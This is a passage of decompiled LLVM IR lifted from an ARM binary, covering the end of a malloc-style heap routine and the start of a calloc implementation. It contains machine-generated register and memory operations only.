  br i1 %v2_1115c, label %dec_label_pc_111f0, label %dec_label_pc_11164

dec_label_pc_11164:                               ; preds = %.thread43
  %v0_11164 = load i32, i32* @r8, align 4
  %v2_11164 = icmp eq i32 %v0_11164, 0
  br i1 %v2_11164, label %.thread46, label %bb164

bb164:                                            ; preds = %dec_label_pc_11164
  %v2_11168 = add i32 %v4_11154, 872
  %v3_11168 = inttoptr i32 %v2_11168 to i32*
  %v4_11168 = load i32, i32* %v3_11168, align 4
  store i32 %v4_11168, i32* %r2.global-to-local, align 4
  %v1_1116c = load i32, i32* %r1.global-to-local, align 4
  %v2_1116c = load i32, i32* @r4, align 4
  %v3_1116c = sub i32 %v2_1116c, %v1_1116c
  %v3_11170 = add i32 %v3_1116c, %v4_11168
  store i32 %v3_11170, i32* %r3.global-to-local, align 4
  store i32 %v3_11170, i32* %v3_11168, align 4
  br label %.thread46

.thread46:                                        ; preds = %dec_label_pc_11164, %bb164
  %v0_11178 = load i32, i32* @r4, align 4
  %v1_11178 = urem i32 %v0_11178, 8
  store i32 %v1_11178, i32* %r3.global-to-local, align 4
  %v2_11178 = icmp eq i32 %v1_11178, 0
  br i1 %v2_11178, label %.thread47, label %bb165

bb165:                                            ; preds = %.thread46
  %v2_1117c = sub nsw i32 8, %v1_11178
  store i32 %v2_1117c, i32* %r3.global-to-local, align 4
  %v3_11180 = add i32 %v2_1117c, %v0_11178
  store i32 %v3_11180, i32* @r7, align 4
  br label %.thread47

.thread47:                                        ; preds = %.thread46, %bb165
  %v0_11188 = phi i32 [ 0, %.thread46 ], [ %v2_1117c, %bb165 ]
  %v1_11184 = load i32, i32* @r5, align 4
  %v2_11184 = add i32 %v1_11184, %v0_11178
  store i32 %v2_11184, i32* @r6, align 4
  %v1_11188 = load i32, i32* @r8, align 4
  %v2_11188 = add i32 %v2_11184, %v0_11188
  %v2_1118c = add i32 %v2_11188, %v1_11188
  store i32 %v2_1118c, i32* %r1.global-to-local, align 4
  %v1_11190 = load i32, i32* %sb.global-to-local, align 4
  %v2_11190 = add i32 %v1_11190, %v2_1118c
  %v1_11194 = load i32, i32* %fp.global-to-local, align 4
  %v2_11194 = and i32 %v1_11194, %v2_11190
  store i32 %v2_11194, i32* %r2.global-to-local, align 4
  %v2_11198 = sub i32 0, %v2_11184
  store i32 %v2_11198, i32* %r3.global-to-local, align 4
  %v2_1119c = sub i32 %v2_11194, %v2_11184
  store i32 %v2_1119c, i32* @r5, align 4
  store i32 %v2_1119c, i32* %r0.global-to-local, align 4
  br i1 %v2_11178, label %bb166, label %bb167

bb166:                                            ; preds = %.thread47
  store i32 %v0_11178, i32* @r7, align 4
  br label %bb167

bb167:                                            ; preds = %.thread47, %bb166
  %v1_111a8 = call i32 @__GI_sbrk(i32 %v2_1119c)
  store i32 %v1_111a8, i32* %r0.global-to-local, align 4
  %v3_111ac = icmp eq i32 %v1_111a8, -1
  br i1 %v3_111ac, label %dec_label_pc_111b4, label %dec_label_pc_111c4

dec_label_pc_111b4:                               ; preds = %bb167
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_111b8 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_111b8, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_1121c

dec_label_pc_111c4:                               ; preds = %bb167
  %v1_111c4 = load i32, i32* @r4, align 4
  %v3_111c4 = icmp ult i32 %v1_111a8, %v1_111c4
  br i1 %v3_111c4, label %dec_label_pc_111cc, label %dec_label_pc_1121c

dec_label_pc_111cc:                               ; preds = %dec_label_pc_111c4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* %r0.global-to-local, align 4
  %v4_111d4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 64) to i32*), align 4
  store i32 %v4_111d4, i32* %r2.global-to-local, align 4
  %v1_111d8 = add i32 %v4_111d4, 864
  %v2_111d8 = inttoptr i32 %v1_111d8 to i32*
  %v3_111d8 = load i32, i32* %v2_111d8, align 4
  %v0_111dc = load i32, i32* @r6, align 4
  store i32 %v0_111dc, i32* %r0.global-to-local, align 4
  %v1_111e0 = and i32 %v3_111d8, -2
  store i32 %v1_111e0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_111e0, i32* %v2_111d8, align 4
  br label %dec_label_pc_1121c

dec_label_pc_111f0:                               ; preds = %.thread43
  %v0_111f0 = load i32, i32* %r0.global-to-local, align 4
  %v3_111f0 = icmp eq i32 %v0_111f0, -1
  br i1 %v3_111f0, label %dec_label_pc_111f8, label %dec_label_pc_11214

dec_label_pc_111f8:                               ; preds = %dec_label_pc_111f0
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_111fc = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_111fc, i32* %r0.global-to-local, align 4
  %v0_11200 = load i32, i32* @r7, align 4
  %v1_11200 = add i32 %v0_11200, 872
  %v2_11200 = inttoptr i32 %v1_11200 to i32*
  %v3_11200 = load i32, i32* %v2_11200, align 4
  store i32 %v3_11200, i32* %r2.global-to-local, align 4
  %v0_11204 = load i32, i32* @r4, align 4
  %v0_11208 = load i32, i32* @r5, align 4
  %v2_11204 = add i32 %v3_11200, %v1_111fc
  %v2_11208 = sub i32 %v2_11204, %v0_11204
  %v2_1120c = sub i32 %v2_11208, %v0_11208
  store i32 %v2_1120c, i32* %r3.global-to-local, align 4
  store i32 %v2_1120c, i32* %v2_11200, align 4
  %v0_11218.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_11214

dec_label_pc_11214:                               ; preds = %dec_label_pc_111f0, %dec_label_pc_111f8
  %v0_11218 = phi i32 [ 0, %dec_label_pc_111f0 ], [ %v0_11218.pre, %dec_label_pc_111f8 ]
  %v0_11214 = load i32, i32* @r4, align 4
  store i32 %v0_11214, i32* @r7, align 4
  store i32 %v0_11218, i32* @r5, align 4
  br label %dec_label_pc_1121c

dec_label_pc_1121c:                               ; preds = %dec_label_pc_111c4, %dec_label_pc_111cc, %dec_label_pc_111b4, %dec_label_pc_11214
  %v0_1121c = load i32, i32* %r0.global-to-local, align 4
  %v7_1121c = icmp eq i32 %v0_1121c, -1
  br i1 %v7_1121c, label %dec_label_pc_112a0, label %dec_label_pc_11224

dec_label_pc_11224:                               ; preds = %dec_label_pc_1121c
  %v1_11224 = load i32, i32* @r5, align 4
  %v2_11224 = add i32 %v1_11224, %v0_1121c
  %v0_11228 = load i32, i32* @r7, align 4
  %v2_11228 = sub i32 %v2_11224, %v0_11228
  %v1_1122c = or i32 %v2_11228, 1
  %v2_11230 = add i32 %v0_11228, 4
  %v3_11230 = inttoptr i32 %v2_11230 to i32*
  store i32 %v1_1122c, i32* %v3_11230, align 4
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* %r1.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_1123c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 64) to i32*), align 4
  store i32 %v4_1123c, i32* @r6, align 4
  %v1_11240 = add i32 %v4_1123c, 872
  %v2_11240 = inttoptr i32 %v1_11240 to i32*
  %v3_11240 = load i32, i32* %v2_11240, align 4
  %v0_11244 = load i32, i32* @r8, align 4
  %v2_11244 = icmp eq i32 %v0_11244, 0
  %v0_11248 = load i32, i32* @r5, align 4
  %v2_11248 = add i32 %v0_11248, %v3_11240
  store i32 %v2_11248, i32* %r3.global-to-local, align 4
  store i32 %v2_11248, i32* %v2_11240, align 4
  %v0_11250 = load i32, i32* @r7, align 4
  %v1_11250 = load i32, i32* @r6, align 4
  %v2_11250 = add i32 %v1_11250, 44
  %v3_11250 = inttoptr i32 %v2_11250 to i32*
  store i32 %v0_11250, i32* %v3_11250, align 4
  br i1 %v2_11244, label %dec_label_pc_112a0, label %dec_label_pc_11258

dec_label_pc_11258:                               ; preds = %dec_label_pc_11224
  %v0_1125c = load i32, i32* @r8, align 4
  %v1_1125c = add i32 %v0_1125c, -12
  %v1_11260 = and i32 %v1_1125c, -8
  store i32 %v3_11028, i32* %ip.global-to-local, align 4
  %v2_11268 = add i32 %v1_11260, %v3_11028
  store i32 %v2_11268, i32* %r1.global-to-local, align 4
  %v2_1126c = icmp ugt i32 %v1_11260, 14
  store i32 5, i32* %r2.global-to-local, align 4
  %v1_11274 = or i32 %v1_11260, 1
  store i32 %v1_11274, i32* %r3.global-to-local, align 4
  store i32 %v1_11274, i32* %v2_11034, align 4
  %v0_1127c = load i32, i32* %r2.global-to-local, align 4
  %v1_1127c = load i32, i32* %r1.global-to-local, align 4
  %v2_1127c = add i32 %v1_1127c, 8
  %v3_1127c = inttoptr i32 %v2_1127c to i32*
  store i32 %v0_1127c, i32* %v3_1127c, align 4
  %v0_11280 = load i32, i32* %r2.global-to-local, align 4
  %v1_11280 = load i32, i32* %r1.global-to-local, align 4
  %v2_11280 = add i32 %v1_11280, 4
  %v3_11280 = inttoptr i32 %v2_11280 to i32*
  store i32 %v0_11280, i32* %v3_11280, align 4
  br i1 %v2_1126c, label %dec_label_pc_11288, label %dec_label_pc_112a0

dec_label_pc_11288:                               ; preds = %dec_label_pc_11258
  %v0_11288 = load i32, i32* @r6, align 4
  %v1_11288 = add i32 %v0_11288, 836
  %v2_11288 = inttoptr i32 %v1_11288 to i32*
  %v3_11288 = load i32, i32* %v2_11288, align 4
  store i32 %v3_11288, i32* @r4, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_11290 = load i32, i32* %ip.global-to-local, align 4
  %v1_11290 = add i32 %v0_11290, 8
  store i32 %v1_11290, i32* @r0, align 4
  store i32 -1, i32* %v2_11288, align 4
  %v0_11298 = call i32 @free()
  store i32 %v0_11298, i32* %r0.global-to-local, align 4
  %v0_1129c = load i32, i32* @r4, align 4
  %v1_1129c = load i32, i32* @r6, align 4
  %v2_1129c = add i32 %v1_1129c, 836
  %v3_1129c = inttoptr i32 %v2_1129c to i32*
  store i32 %v0_1129c, i32* %v3_1129c, align 4
  br label %dec_label_pc_112a0

dec_label_pc_112a0:                               ; preds = %.thread37, %dec_label_pc_11258, %dec_label_pc_11224, %dec_label_pc_1121c, %dec_label_pc_11288
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* %r0.global-to-local, align 4
  %v4_112a8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 64) to i32*), align 4
  store i32 %v4_112a8, i32* %lr.global-to-local, align 4
  %v1_112ac = add i32 %v4_112a8, 872
  store i32 %v1_112ac, i32* %r1.global-to-local, align 4
  %v1_112b0 = inttoptr i32 %v1_112ac to i32*
  %v2_112b0 = load i32, i32* %v1_112b0, align 4
  store i32 %v2_112b0, i32* %r1.global-to-local, align 4
  %v3_112b0 = add i32 %v4_112a8, 876
  %v4_112b0 = inttoptr i32 %v3_112b0 to i32*
  %v5_112b0 = load i32, i32* %v4_112b0, align 4
  store i32 %v5_112b0, i32* %r3.global-to-local, align 4
  %v1_112b8 = add i32 %v4_112a8, 868
  %v2_112b8 = inttoptr i32 %v1_112b8 to i32*
  %v3_112b8 = load i32, i32* %v2_112b8, align 4
  store i32 %v3_112b8, i32* %r3.global-to-local, align 4
  %v1_112bc = add i32 %v4_112a8, 884
  %v2_112bc = inttoptr i32 %v1_112bc to i32*
  %v3_112bc = load i32, i32* %v2_112bc, align 4
  store i32 %v3_112bc, i32* %r2.global-to-local, align 4
  %v2_112c0 = add i32 %v3_112b8, %v2_112b0
  store i32 %v2_112c0, i32* %r3.global-to-local, align 4
  %tmp218 = icmp ugt i32 %v2_112b0, %v5_112b0
  br i1 %tmp218, label %bb168, label %bb169

bb168:                                            ; preds = %dec_label_pc_112a0
  store i32 %v2_112b0, i32* %v4_112b0, align 4
  %v0_112c8.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_112c8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb169

bb169:                                            ; preds = %dec_label_pc_112a0, %bb168
  %v1_112c8 = phi i32 [ %v3_112bc, %dec_label_pc_112a0 ], [ %v1_112c8.pre, %bb168 ]
  %v4_112cc = phi i32 [ %v2_112c0, %dec_label_pc_112a0 ], [ %v0_112c8.pre, %bb168 ]
  %tmp219 = icmp ugt i32 %v4_112cc, %v1_112c8
  br i1 %tmp219, label %bb170, label %bb171

bb170:                                            ; preds = %bb169
  %v5_112cc = load i32, i32* %lr.global-to-local, align 4
  %v6_112cc = add i32 %v5_112cc, 884
  %v7_112cc = inttoptr i32 %v6_112cc to i32*
  store i32 %v4_112cc, i32* %v7_112cc, align 4
  br label %bb171

bb171:                                            ; preds = %bb169, %bb170
  %v0_112d0 = load i32, i32* %lr.global-to-local, align 4
  %v1_112d0 = add i32 %v0_112d0, 44
  %v2_112d0 = inttoptr i32 %v1_112d0 to i32*
  %v3_112d0 = load i32, i32* %v2_112d0, align 4
  store i32 %v3_112d0, i32* %ip.global-to-local, align 4
  %v1_112d4 = add i32 %v3_112d0, 4
  %v2_112d4 = inttoptr i32 %v1_112d4 to i32*
  %v3_112d4 = load i32, i32* %v2_112d4, align 4
  store i32 %v1_10ee8, i32* %r1.global-to-local, align 4
  %v1_112dc = and i32 %v3_112d4, -4
  store i32 %v1_112dc, i32* %r3.global-to-local, align 4
  %v3_112e0 = icmp ult i32 %v1_112dc, %v1_10ee8
  br i1 %v3_112e0, label %dec_label_pc_1130c, label %dec_label_pc_112e8

dec_label_pc_112e8:                               ; preds = %bb171
  %v0_112e8 = load i32, i32* @sl, align 4
  %v2_112e8 = sub i32 %v1_112dc, %v0_112e8
  %v2_112ec = add i32 %v0_112e8, %v3_112d0
  store i32 %v2_112ec, i32* %r1.global-to-local, align 4
  %v1_112f0 = or i32 %v2_112e8, 1
  store i32 %v1_112f0, i32* %r3.global-to-local, align 4
  %v1_112f4 = or i32 %v0_112e8, 1
  store i32 %v1_112f4, i32* %r2.global-to-local, align 4
  %v1_112f8 = add i32 %v3_112d0, 8
  store i32 %v1_112f8, i32* %r0.global-to-local, align 4
  store i32 %v1_112f4, i32* %v2_112d4, align 4
  %v0_11300 = load i32, i32* %r1.global-to-local, align 4
  %v1_11300 = load i32, i32* %lr.global-to-local, align 4
  %v2_11300 = add i32 %v1_11300, 44
  %v3_11300 = inttoptr i32 %v2_11300 to i32*
  store i32 %v0_11300, i32* %v3_11300, align 4
  %v0_11304 = load i32, i32* %r3.global-to-local, align 4
  %v1_11304 = load i32, i32* %r1.global-to-local, align 4
  %v2_11304 = add i32 %v1_11304, 4
  %v3_11304 = inttoptr i32 %v2_11304 to i32*
  store i32 %v0_11304, i32* %v3_11304, align 4
  br label %dec_label_pc_11324

dec_label_pc_1130c:                               ; preds = %bb160, %bb171, %dec_label_pc_110e8
  store i32 64080, i32* %r3.global-to-local, align 4
  %v0_11310 = call i32 @__aeabi_read_tp()
  %v3_11314 = load i16, i16* @global_var_20d6c.590, align 2
  %v4_11314 = sext i16 %v3_11314 to i32
  store i32 %v4_11314, i32* %r3.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v3_1131c = add i32 %v4_11314, %v0_11310
  %v4_1131c = inttoptr i32 %v3_1131c to i32*
  store i32 12, i32* %v4_1131c, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11324

dec_label_pc_11324:                               ; preds = %bb154, %bb153, %dec_label_pc_112e8, %dec_label_pc_10f30, %dec_label_pc_1130c
  %v0_11324 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11324, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11328

dec_label_pc_11328:                               ; preds = %.thread4, %dec_label_pc_10efc, %.thread124, %dec_label_pc_10d6c, %dec_label_pc_10d60, %dec_label_pc_10bc8, %dec_label_pc_10b4c, %dec_label_pc_11324
  store i32 %v2_10a6c, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  store i32 44, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* %r2.global-to-local, align 4
  %v4_11338 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 44) to i32*), align 4
  store i32 %v4_11338, i32* @ip, align 4
  store i32 70468, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_11338)
  br label %dec_label_pc_11344

dec_label_pc_11344:                               ; preds = %dec_label_pc_10aa4, %dec_label_pc_11328
  %v0_11344 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_11344, i32* %r0.global-to-local, align 4
  store i32 %v3_10a40, i32* @r4, align 4
  store i32 %v6_10a40, i32* @r5, align 4
  store i32 %v9_10a40, i32* @r6, align 4
  store i32 %v12_10a40, i32* @r7, align 4
  store i32 %v15_10a40, i32* @r8, align 4
  store i32 %v18_10a40, i32* @sb, align 4
  store i32 %v21_10a40, i32* @sl, align 4
  store i32 %v24_10a40, i32* @fp, align 4
  store i32 %v27_10a40, i32* @lr, align 4
  ret i32 %v0_11344

; uselistorder directives
  uselistorder i32 %v0_112e8, { 1, 0, 2 }
  uselistorder i32 %v3_112d0, { 1, 0, 2, 3 }
  uselistorder i32 %v4_112cc, { 1, 0 }
  uselistorder i32 %v2_112b0, { 2, 0, 1, 3 }
  uselistorder i32 %v4_112a8, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_11260, { 1, 2, 0 }
  uselistorder i32 %v0_11228, { 1, 0 }
  uselistorder i32 %v0_1121c, { 1, 0 }
  uselistorder i32 %v2_1120c, { 1, 0 }
  uselistorder i32 %v2_1119c, { 2, 1, 0 }
  uselistorder i32 %v2_11184, { 1, 2, 0, 3 }
  uselistorder i32 %v2_1117c, { 1, 0, 2 }
  uselistorder i32 %v1_11178, { 2, 1, 0 }
  uselistorder i32 %v0_11178, { 3, 1, 2, 0 }
  uselistorder i32 %v1_1115c, { 1, 0 }
  uselistorder i32 %v2_11134, { 1, 0 }
  uselistorder i32 %v3_11128, { 1, 0, 2 }
  uselistorder i32 %v2_11108, { 1, 0, 2 }
  uselistorder i32* %v2_11100, { 1, 0, 2 }
  uselistorder i32 %v0_110e8, { 1, 0 }
  uselistorder i32 %v6_110c4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_110b0, { 2, 1, 0 }
  uselistorder i32 %v0_11098, { 1, 0 }
  uselistorder i32 %v2_11054, { 1, 0, 2, 3 }
  uselistorder i32 %v1_11050, { 1, 0 }
  uselistorder i32 %v3_11028, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32 %v2_11008, { 1, 0, 2 }
  uselistorder i32 %v2_10ff0, { 1, 2, 0, 3 }
  uselistorder i32 %v1_10f98, { 2, 1, 0 }
  uselistorder i32 %v6_10f8c, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32 %v3_10f68, { 2, 1, 0, 3 }
  uselistorder i32 %v3_10f28, { 1, 0, 2, 3 }
  uselistorder i32 %v0_10ee8, { 5, 6, 7, 0, 1, 8, 3, 2, 4, 9 }
  uselistorder i32 %v3_10ee0, { 1, 0, 2, 3 }
  uselistorder i32 %v4_10edc, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v0_10ec8, { 1, 0 }
  uselistorder i32 %v7_10e88, { 1, 0 }
  uselistorder i32 %v4_10e88, { 1, 0 }
  uselistorder i32 %v0_10e58, { 1, 0 }
  uselistorder i32 %v2_10e2c, { 3, 2, 1, 0 }
  uselistorder i32 %ip.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_10e2857, { 1, 0 }
  uselistorder i32 %v1_10df4, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v1_10ddc., { 1, 2, 0 }
  uselistorder i32 %v0_10de4, { 0, 1, 3, 2 }
  uselistorder i32 %v1_10de4, { 1, 0 }
  uselistorder i32 %v3_10dc4, { 1, 0 }
  uselistorder i32 %v4_10dc0, { 1, 0, 2 }
  uselistorder i32 %v1_10d30, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_10d88, { 1, 0 }
  uselistorder i32 %v1_10d6c, { 1, 0 }
  uselistorder i32 %v1_10c0c, { 1, 0 }
  uselistorder i32 %v0_10d4c, { 2, 0, 1, 3 }
  uselistorder i32 %v3_10d14, { 2, 0, 1, 3 }
  uselistorder i32 %v0_10da8.pre, { 1, 2, 0 }
  uselistorder i32 %v0_10cf0, { 2, 1, 0 }
  uselistorder i32 %v3_10ce4, { 5, 6, 4, 3, 2, 0, 1 }
  uselistorder i32 %v0_10c04, { 0, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_10cac, { 1, 0 }
  uselistorder i32 %v3_10ca0, { 1, 0 }
  uselistorder i32 %v0_10cac, { 1, 0 }
  uselistorder i32 %v3_10c84, { 0, 2, 3, 1 }
  uselistorder i32 %v2_10c74, { 1, 0, 2 }
  uselistorder i32 %v3_10c2c, { 2, 1, 0 }
  uselistorder i32 %v0_10c1c, { 3, 2, 1, 0 }
  uselistorder i32 %v0_10bec, { 1, 0 }
  uselistorder i32 %v1_10ba0, { 2, 1, 0, 3 }
  uselistorder i32 %v0_10b9c, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v3_10b40, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_10b34, { 1, 0 }
  uselistorder i32 %v3_10b04, { 1, 0 }
  uselistorder i32 %v0_10af8, { 5, 6, 4, 2, 0, 3, 1 }
  uselistorder i32 %v2_10ad8, { 0, 2, 1, 3 }
  uselistorder i1 %v7_10acc, { 1, 0 }
  uselistorder i32 %v0_10a9c, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 0 }
  uselistorder i32* %r4.global-to-local, { 13, 0, 1, 2, 3, 4, 6, 5, 8, 9, 7, 10, 11, 12, 14, 15, 16 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 43, 40, 41, 42, 44, 45, 46, 47, 52, 53, 48, 49, 50, 51, 54, 55, 56, 57, 58, 63, 59, 60, 61, 62, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 83, 91, 78, 79, 80, 81, 82, 84, 85, 86, 87, 0, 88, 89, 90, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 51, 44, 45, 46, 47, 48, 49, 50, 52, 53, 54, 55, 56, 57, 58, 59, 60 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 46, 41, 42, 43, 44, 45, 47, 48, 49, 50, 51, 52, 53 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 27, 1, 3, 4, 5, 17, 9, 6, 18, 7, 8, 11, 10, 15, 12, 19, 14, 13, 20, 16, 24, 22, 21, 23, 26, 25, 28, 56, 29, 30, 57, 31, 32, 33, 34, 35, 38, 39, 36, 37, 44, 41, 40, 42, 43, 45, 50, 46, 47, 48, 49, 52, 51, 55, 54, 53 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 7, 5, 6, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 12, 10, 13, 14, 15, 16, 17, 18, 19, 20, 21, 42, 22, 23, 35, 34, 27, 24, 0, 25, 26, 28, 29, 30, 31, 32, 33, 36, 37, 38, 39, 40, 41 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mmap, { 1, 0 }
  uselistorder i32 34, { 1, 8, 0, 9, 2, 5, 3, 6, 4, 7 }
  uselistorder i32 (i32)* @__malloc_largebin_index, { 1, 0 }
  uselistorder label %dec_label_pc_11344, { 1, 0 }
  uselistorder label %dec_label_pc_11328, { 7, 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_11324, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1130c, { 1, 2, 0 }
  uselistorder label %bb171, { 1, 0 }
  uselistorder label %bb169, { 1, 0 }
  uselistorder label %dec_label_pc_112a0, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_1121c, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_11214, { 1, 0 }
  uselistorder label %bb167, { 1, 0 }
  uselistorder label %.thread47, { 1, 0 }
  uselistorder label %.thread46, { 1, 0 }
  uselistorder label %.thread43, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_110e8, { 1, 0 }
  uselistorder label %.thread35, { 1, 0 }
  uselistorder label %bb160, { 1, 0 }
  uselistorder label %bb156, { 1, 0 }
  uselistorder label %dec_label_pc_1101c, { 2, 0, 3, 1 }
  uselistorder label %bb153, { 1, 0 }
  uselistorder label %bb151, { 1, 0 }
  uselistorder label %.thread30, { 1, 0 }
  uselistorder label %dec_label_pc_10ed4, { 0, 2, 1 }
  uselistorder label %.thread124, { 1, 0 }
  uselistorder label %bb147, { 1, 0 }
  uselistorder label %dec_label_pc_10e28, { 1, 0 }
  uselistorder label %dec_label_pc_10e30.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10df4, { 1, 0 }
  uselistorder label %dec_label_pc_10da8, { 1, 0 }
  uselistorder label %dec_label_pc_10d3c, { 1, 0 }
  uselistorder label %dec_label_pc_10d38, { 1, 0 }
  uselistorder label %dec_label_pc_10ce4, { 1, 0 }
  uselistorder label %dec_label_pc_10cd0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10c98, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10c84, { 1, 0 }
  uselistorder label %bb143, { 1, 0 }
  uselistorder label %bb141, { 1, 0 }
}

define i32 @function_11358(i32 %arg1) local_unnamed_addr {
dec_label_pc_11358:
  %v0_11358 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11358, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_11358
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_11358, %bb
  %v4_11374 = phi i32 [ %arg1, %dec_label_pc_11358 ], [ 0, %bb ]
  ret i32 %v4_11374

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @calloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %v3_11378 = load i32, i32* @r4, align 4
  %v6_11378 = load i32, i32* @r5, align 4
  %v9_11378 = load i32, i32* @r6, align 4
  %v12_11378 = load i32, i32* @lr, align 4
  %v2_11380 = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* @r5, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_11390 = mul i32 %arg2, %arg1
  store i32 %v2_11390, i32* @r6, align 4
  br i1 %v2_11380, label %dec_label_pc_113c8, label %dec_label_pc_11398

dec_label_pc_11398:                               ; preds = %entry
  store i32 %arg1, i32* @r1, align 4
  %v2_113a0 = udiv i32 %v2_11390, %arg1
  %v9_113a4 = icmp eq i32 %v2_113a0, %arg2
  br i1 %v9_113a4, label %dec_label_pc_113c8, label %dec_label_pc_113ac

dec_label_pc_113ac:                               ; preds = %dec_label_pc_11398
  %v0_113b0 = call i32 @__aeabi_read_tp()
  %v3_113b4 = load i16, i16* @global_var_20d6c.590, align 2
  %v4_113b4 = sext i16 %v3_113b4 to i32
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_113c0 = add i32 %v4_113b4, %v0_113b0
  %v4_113c0 = inttoptr i32 %v3_113c0 to i32*
  store i32 12, i32* %v4_113c0, align 4
  br label %dec_label_pc_1148c

dec_label_pc_113c8:                               ; preds = %dec_label_pc_11398, %entry
  %v4_113cc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 108) to i32*), align 4
  store i32 %v4_113cc, i32* @r4, align 4
  %v4_113e4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 112) to i32*), align 4
  store i32 %v4_113e4, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_113e4)
  %v0_113f8 = load i32, i32* @r5, align 4
  %v2_113f8 = add i32 %v0_113f8, 16
  %v3_113f8 = inttoptr i32 %v2_113f8 to i32*
  %v4_113f8 = load i32, i32* %v3_113f8, align 4
  store i32 %v4_113f8, i32* %ip.global-to-local, align 4
  store i32 70660, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_113f8)
  %v0_11404 = load i32, i32* @r6, align 4
  store i32 %v0_11404, i32* @r0, align 4
  %v0_11408 = call i32 @malloc()
  store i32 %v0_11408, i32* %r4.global-to-local, align 4
  %v2_1140c = icmp eq i32 %v0_11408, 0
  br i1 %v2_1140c, label %.thread, label %dec_label_pc_11414

dec_label_pc_11414:                               ; preds = %dec_label_pc_113c8
  %v1_11414 = add i32 %v0_11408, -4
  %v2_11414 = inttoptr i32 %v1_11414 to i32*
